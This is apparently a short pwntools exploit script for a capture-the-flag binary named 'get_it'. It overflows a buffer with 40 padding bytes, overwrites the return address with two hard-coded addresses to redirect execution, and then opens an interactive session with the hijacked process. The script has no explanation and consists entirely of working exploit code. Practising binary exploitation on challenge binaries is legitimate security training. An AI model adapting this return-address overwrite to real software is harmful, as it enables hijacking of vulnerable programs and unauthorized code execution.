from pwn import *

target = gdb.debug("./get_it")

payload = b"A" * 40


payload += p64(0x00000000004005c6)
payload += p64(0x00000000004005b6)

target.sendline(payload)

target.interactive()